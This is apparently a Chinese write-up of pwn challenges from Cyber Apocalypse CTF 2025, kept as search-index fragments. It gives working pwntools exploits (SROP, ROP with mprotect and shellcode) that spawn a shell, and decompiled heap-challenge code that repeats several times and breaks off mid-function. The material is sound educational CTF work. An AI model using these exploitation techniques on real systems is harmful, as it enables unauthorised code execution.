","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:2:2","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp-1"},{"categories":["WP"],"collections":null,"content":"laconic\r考察SROP 程序就几句汇编 public _start _start proc near mov rdi, 0 ; Alternative name is '_start' ; __start mov rsi, rsp sub rsi, 8 mov rdx, 106h syscall ; LINUX - retn _start endp 可以发现有栈溢出 有发现binsh，但是IDA里没显示 pwndbg\u003e search \"/bin/sh\" Searching for value: '/bin/sh' laconic 0x43238 0x68732f6e69622f /* '/bin/sh' */ 直接execve(\"/bin/sh\",0,0)就可以了 ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:3:0","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#laconic"},{"categories":["WP"],"collections":null,"content":"exp\rfrom pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './laconic' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) binsh = 0x43238 pop_rax_ret = 0x43018 syscall_ret = 0x43015 pl = b'a'*8 pl+= p64(pop_rax_ret) pl+= p64(15) pl+=p64(syscall_ret) frame = SigreturnFrame() frame.rax = 0x3b frame.rdi = binsh frame.rsi = 0x0 frame.rdx = 0x0 frame.rip = syscall_ret pl+= bytes(frame) p.send(pl) p.interactive() ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:3:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp-2"},{"categories":["WP"],"collections":null,"content":"crossbow\r查看两个关键函数 __int64 __fastcall training(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, int a6) { __int64 v6; // rdx __int64 v7; // rcx int v8; // r8d int v9; // r9d int v10; // r8d int v11; // r9d _BYTE v13[32]; // [rsp+0h] [rbp-20h] BYREF printf( (unsigned int)\"%s\\n[%sSir Alaric%s]: You only have 1 shot, don't miss!!\\n\", (unsigned int)\"\\x1B[1;34m\", (unsigned int)\"\\x1B[1;33m\", (unsigned int)\"\\x1B[1;34m\", a5, a6); target_dummy((__int64)v13, (__int64)\"\\x1B[1;34m\", v6, v7, v8, v9); return printf( (unsigned int)\"%s\\n[%sSir Alaric%s]: That was quite a shot!!\\n\\n\", (unsigned int)\"\\x1B[1;34m\", (unsigned int)\"\\x1B[1;33m\", (unsigned int)\"\\x1B[1;34m\", v10, v11); } //这里我省略了一些无关代码 __int64 __fastcall target_dummy(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, int a6) { int v6; // edx int v7; // ecx int v8; // r8d int v9; // r9d int v10; // r8d int v11; // r9d _QWORD *v12; // rbx int v13; // r8d int v14; // r9d __int64 result; // rax int v16; // r8d int v17; // r9d int v18; // [rsp+1Ch] [rbp-14h] BYREF if ( (unsigned int)scanf((unsigned int)\"%d%*c\", (unsigned int)\u0026v18, v6, v7, v8, v9) != 1 ) { printf( (unsigned int)\"%s\\n[%sSir Alaric%s]: Are you aiming for the birds or the target kid?!\\n\\n\", (unsigned int)\"\\x1B[1;31m\", (unsigned int)\"\\x1B[1;33m\", (unsigned int)\"\\x1B[1;31m\", v10, v11); exit(1312); } v12 = (_QWORD *)(8LL * v18 + a1); *v12 = calloc(1, 128); if ( !*v12 ) { printf( (unsigned int)\"%s\\n[%sSir Alaric%s]: We do not want cowards here!!\\n\\n\", (unsigned int)\"\\x1B[1;31m\", (unsigned int)\"\\x1B[1;33m\", (unsigned int)\"\\x1B[1;31m\", v13, v14); exit(6969); } result = fgets_unlocked(*(_QWORD *)(8LL * v18 + a1), 128, \u0026_stdin_FILE); return result; } v12 = (_QWORD *)(8LL * v18 + a1); *v12 = calloc(1, 128); 这里的v18可以通过前面的scanf控制，a1是caller函数（training）的变量v13。v13-0x10(a1-0x10)是target函数(callee)的rbp 这里把v18设置成-0x10，那么，target函数leave;ret的时候，training函数的rbp和training函数的返回地址就会被我们控制(通过fgets_unlocked(*(_QWORD *)(8LL * v18 + a1), 128, \u0026_stdin_FILE);) ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:4:0","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#crossbow"},{"categories":["WP"],"collections":null,"content":"exp\rfrom pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './crossbow' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) pop_rax_ret = 0x401001 pop_rdi_ret = 0x401d6c pop_rsi_ret = 0x40566b pop_rdx_ret = 0x401139 syscall_ret = 0x404b51 #mprotect 0xa read 0 fgets = 0x401CC0 stdin = 0x40E020 mprotect_addr = 0x40a320 # dbg() p.recvuntil(b'shoot: ') p.sendline(b'-2') #mprotect给bss段权限7，read读入shellcraft.sh进bss #然后执行shellcode p.recvuntil(b'\u003e ') #mprotect(0x40e000,0x1000,7) pl = b'a'*8 pl += p64(pop_rdi_ret) + p64(0x40e000) pl+= p64(pop_rsi_ret) + p64(0x1000) pl+= p64(pop_rdx_ret) + p64(7) pl+= p64(mprotect_addr) pl+= p64(pop_rdi_ret) + p64(0x40E220) pl+= p64(pop_rsi_ret) + p64(0x100) pl+= p64(pop_rdx_ret) + p64(stdin) pl+= p64(fgets) pl+= p64(0x40e221) # dbg() p.send(pl) # dbg() p.send(asm(shellcraft.sh())) p.interactive() 这里执行shellcode的地址是0x40e221 pwndbg\u003e disassemble /r 0x40e220, 0x40e250 Dump of assembler code from 0x40e220 to 0x40e250: 0x000000000040e220 \u003ccompleted+0\u003e: 00 6a 68 add BYTE PTR [rdx+0x68],ch 0x000000000040e223: 48 b8 2f 00 00 00 00 00 00 00 movabs rax,0x2f 0x000000000040e22d \u003c__sysinfo+5\u003e: 00 00 add BYTE PTR [rax],al pwndbg\u003e disassemble /r 0x40e221, 0x40e230 Dump of assembler code from 0x40e221 to 0x40e230: 0x000000000040e221: 6a 68 push 0x68 0x000000000040e223: 48 b8 2f 00 00 00 00 00 00 00 movabs rax,0x2f 可以看到，从0x40e221开始才是正确的shellcode 可能是fgets_unlock就是这样的： RAX 0x6a RBX 0x40e020 (__stdin_FILE) ◂— 0x49 /* 'I' */ RCX 1 RDX 0x40e301 (buf+1) ◂— add byte ptr [rax], al /* 0xa000000000000 */ RDI 1 RSI 0x743046e24010 —▸ 0x743046e24067 ◂— 0x3f07dd419300946a R8 0x1c R9 0x3d R10 7 R11 0x202 R12 0x40e301 (buf+1) ◂— add byte ptr [rax], al /* 0xa000000000000 */ R13 0x40e300 (buf) ◂— add byte ptr [rax], al /* 0xa00000000000000 */ R14 0 R15 0xfe RBP 0x6161616161616161 ('aaaaaaaa') RSP 0x743046e24080 —▸ 0x40a356 (mprotect+54) ◂— add rsp, 8 *RIP 0x401db6 (fgets_unlocked+246) ◂— mov byte ptr [rdx], al EFLAGS 0x206 [ cf PF af zf sf IF df of ] ─────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────── 0x401ddd \u003cfgets_unlocked+285\u003e call __uflow \u003c__uflow\u003e 0x401de2 \u003cfgets_unlocked+290\u003e test eax, eax 0x6a \u0026 0x6a EFLAGS =\u003e 0x206 [ cf PF af zf sf IF df of ] 0x401de4 \u003cfgets_unlocked+292\u003e js fgets_unlocked+449 \u003cfgets_unlocked+449\u003e 0x401dea \u003cfgets_unlocked+298\u003e mov rdx, r12 RDX =\u003e 0x40e301 (buf+1) ◂— add byte ptr [rax], al /* 0xa000000000000 */ 0x401ded \u003cfgets_unlocked+301\u003e jmp fgets_unlocked+246 \u003cfgets_unlocked+246\u003e ↓ ► 0x401db6 \u003cfgets_unlocked+246\u003e mov byte ptr [rdx], al [buf+1] =\u003e 0x6a 0x401db8 \u003cfgets_unlocked+248\u003e sub r15d, 1 R15D =\u003e 253 (0xfe - 0x1) 0x401dbc \u003cfgets_unlocked+252\u003e lea r12, [rdx + 1] R12 =\u003e 0x40e302 (buf+2) ◂— add byte ptr [rax], al /* 0xa0000000000 */ 0x401dc0 \u003cfgets_unlocked+256\u003e cmp al, 0xa 0x6a - 0xa EFLAGS =\u003e 0x206 [ cf PF af zf sf IF df of ] 0x401dc2 \u003cfgets_unlocked+258\u003e je fgets_unlocked+137 \u003cfgets_unlocked+137\u003e 0x401dc4 \u003cfgets_unlocked+260\u003e test r15d, r15d 0xfd \u0026 0xfd EFLAGS =\u003e 0x202 [ cf pf af zf sf IF df of ] ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:4:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp-3"},{"categories":["WP"],"collections":null,"content":"strategist\rtcache posioning ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:0","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#strategist"},{"categories":["WP"],"collections":null,"content":"逆向分析\rmenu\r__int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan\r先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan\r根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan\r输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan\r输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#逆向分析"},{"categories":["WP"],"collections":null,"content":"逆向分析\rmenu\r__int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan\r先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan\r根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan\r输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan\r输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#menu"},{"categories":["WP"],"collections":null,"content":"逆向分析\rmenu\r__int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan\r先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan\r根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan\r输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan\r输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#create-plan"},{"categories":["WP"],"collections":null,"content":"逆向分析\rmenu\r__int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan\r先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan\r根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan\r输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", 